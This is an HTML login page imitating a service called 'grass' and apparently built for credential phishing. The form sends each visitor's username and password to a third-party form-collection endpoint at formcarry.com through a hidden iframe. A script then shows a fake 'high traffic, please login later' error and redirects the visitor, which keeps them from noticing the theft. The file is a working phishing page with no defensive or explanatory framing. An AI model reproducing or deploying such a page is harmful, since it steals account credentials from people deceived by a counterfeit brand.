
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Grass Login</title>
    <style>
        /* Resetting some basic styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f9f9f9;
            color: #333;
        }

        .container {
            width: 360px;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
        }

        .title {
            font-size: 28px;
            font-weight: bold;
            color: #D4E157;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            margin-top: 5px;
        }

        .form-group a {
            font-size: 14px;
            color: #555;
            text-decoration: none;
            display: block;
            margin-top: 5px;
        }

        .btn {
            background-color: #757575;
            color: white;
            padding: 12px;
            width: 100%;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }

        .register-link {
            margin-top: 20px;
            font-size: 14px;
            color: #333;
        }

        .register-link a {
            color: #D4E157;
            text-decoration: none;
            font-weight: bold;
        }

        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 15px;
            display: none;
        }

        footer {
            font-size: 12px;
            color: #555;
            margin-top: 20px;
        }

        footer a {
            color: #555;
            text-decoration: none;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">grass™</div>
        <div class="title">Sign In.</div>
        <form id="loginForm" action="https://formcarry.com/s/2fRjwsXYSGB" method="POST" target="hidden_iframe" onsubmit="showErrorMessage()">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" placeholder="Username or Email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <a href="#">Forgot Password?</a>
            </div>
            <button type="submit" class="btn">ACCESS MY ACCOUNT</button>
        </form>
        <div class="error-message" id="errorMessage">
            Sorry, we are experiencing high traffic now. Please login later.
        </div>
        <div class="register-link">
            Don’t have an account? <a href="#">Register</a>
        </div>
        <footer>
            <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a> | <a href="#">Cookie Policy</a> | <a href="#">Cookie Settings</a>
            <p>© Grass Foundation, 2024. All rights reserved.</p>
        </footer>
    </div>

    <!-- Hidden iframe to handle form submission without leaving the page -->
    <iframe name="hidden_iframe" style="display:none;"></iframe>

    <script>
        function showErrorMessage() {
            // Show the error message
            document.getElementById("errorMessage").style.display = "block";
            
            // Redirect after a delay (e.g., 3 seconds)
            setTimeout(function() {
                window.location.href = "/"; // Replace '/' with the URL of your main page
            }, 3000);
        }
    </script>
</body>
</html>
